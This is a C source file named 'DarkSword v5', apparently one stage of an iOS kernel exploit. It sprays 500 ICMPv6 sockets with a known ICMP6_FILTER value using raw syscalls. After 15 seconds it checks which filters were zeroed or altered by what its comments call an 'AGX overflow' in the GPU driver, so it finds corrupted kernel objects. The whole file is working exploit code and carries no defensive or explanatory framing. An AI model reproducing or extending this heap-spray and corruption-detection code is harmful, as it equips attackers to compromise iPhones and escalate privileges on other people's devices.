// DarkSword v5: Write to app Documents (sandbox-safe) + use NSLog for output
#define AF_INET6 30
#define SOCK_DGRAM 2
#define IPPROTO_ICMPV6 58
#define ICMP6_FILTER 18
#define NUM_SOCKETS 500

static long sys3(long n, long a, long b, long c) {
    register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c; register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x16) : "memory");
    return x0;
}
static long sys2(long n, long a, long b) {
    register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x16) : "memory");
    return x0;
}
static long sys5(long n, long a, long b, long c, long d, long e) {
    register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e; register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x16) : "memory");
    return x0;
}

// Use NSLog to output (visible via syslog capture)
extern void NSLog(void *fmt, ...);
extern void *__CFStringMakeConstantString(const char *);
#define NSLOG(s, ...) NSLog(__CFStringMakeConstantString(s), ##__VA_ARGS__)

extern void CFRunLoopRun(void);
extern double CFAbsoluteTimeGetCurrent(void);
typedef const void* CFRunLoopTimerRef;
extern CFRunLoopTimerRef CFRunLoopTimerCreate(void*, double, double, int, int, void(*)(CFRunLoopTimerRef,void*), void*);
extern void CFRunLoopAddTimer(void*, CFRunLoopTimerRef, void*);
extern void* CFRunLoopGetCurrent(void);
extern void* kCFRunLoopDefaultMode;

static int g_fds[NUM_SOCKETS];
static int g_created = 0;
static unsigned char g_orig_filter[32];
static int g_scanned = 0;

static void scan_filters(void) {
    if (g_scanned) return;
    g_scanned = 1;

    int corrupted = 0, zeroed = 0, errors = 0;
    NSLOG("DARKSWORD_SCAN_START total=%d", g_created);

    for (int i = 0; i < g_created; i++) {
        unsigned char cur[32];
        int optlen = 32;
        long ret = sys5(118/*getsockopt*/, g_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, (long)cur, (long)&optlen);
        if (ret < 0) { errors++; corrupted++; continue; }

        int all_ff = 1, all_zero = 1;
        for (int j = 0; j < 32; j++) {
            if (cur[j] != 0xFF) all_ff = 0;
            if (cur[j] != 0x00) all_zero = 0;
        }

        if (all_zero) {
            NSLOG("DARKSWORD_ZEROED idx=%d fd=%d", i, g_fds[i]);
            corrupted++; zeroed++;
        } else if (!all_ff) {
            NSLOG("DARKSWORD_CHANGED idx=%d fd=%d byte0=%02x", i, g_fds[i], cur[0]);
            corrupted++;
        }
    }

    NSLOG("DARKSWORD_DONE corrupted=%d zeroed=%d errors=%d total=%d", corrupted, zeroed, errors, g_created);
}

static void timer_cb(CFRunLoopTimerRef t, void *info) {
    // Auto-scan after 15 seconds (give time for AGX overflow to fire)
    static int ticks = 0;
    ticks++;
    if (ticks == 15) {
        NSLOG("DARKSWORD_AUTO_SCAN at tick %d", ticks);
        scan_filters();
    }
}

int main(void) {
    for (int i = 0; i < 32; i++) g_orig_filter[i] = 0xFF;
    for (int i = 0; i < NUM_SOCKETS; i++) {
        long fd = sys3(97, AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        if (fd >= 0) {
            sys5(105, fd, IPPROTO_ICMPV6, ICMP6_FILTER, (long)g_orig_filter, 32);
            g_fds[g_created++] = (int)fd;
        }
    }
    NSLOG("DARKSWORD_READY sockets=%d", g_created);

    // Timer fires every 1 second, auto-scans at tick 15
    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(
        (void*)0, CFAbsoluteTimeGetCurrent() + 1.0, 1.0, 0, 0, timer_cb, (void*)0);
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopDefaultMode);
    CFRunLoopRun();
    return 0;
}
